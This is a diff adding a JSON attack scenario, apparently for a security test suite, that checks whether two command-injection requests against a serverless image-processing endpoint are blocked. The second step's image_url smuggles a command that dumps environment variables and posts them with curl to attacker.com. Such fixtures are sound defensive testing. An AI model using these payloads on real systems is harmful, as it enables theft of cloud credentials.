@@ -1,0 +1,54 @@
+{
+  "id": "cloud-native-lambda-hijack",
+  "name": "Serverless Function Environment Hijacking",
+  "category": "Cloud Native",
+  "difficulty": "Advanced",
+  "description": "Exploits command injection in a serverless function to exfiltrate temporary credentials from the environment.",
+  "steps": [
+    {
+      "id": "injection-probe",
+      "name": "Command Injection Probe",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/infrastructure/compute/process-image",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "image_url": "https://example.com/test.jpg; id"
+        }
+      },
+      "execution": {
+        "delayMs": 500
+      },
+      "expect": {
+        "blocked": true
+      }
+    },
+    {
+      "id": "env-exfiltration",
+      "name": "Exfiltrate Function Environment Variables",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/infrastructure/compute/process-image",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "image_url": "https://example.com/test.jpg; env > /tmp/out.txt; curl -X POST -d @/tmp/out.txt https://attacker.com/leak"
+        }
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "injection-probe"
+      ]
+    }
+  ]
+}
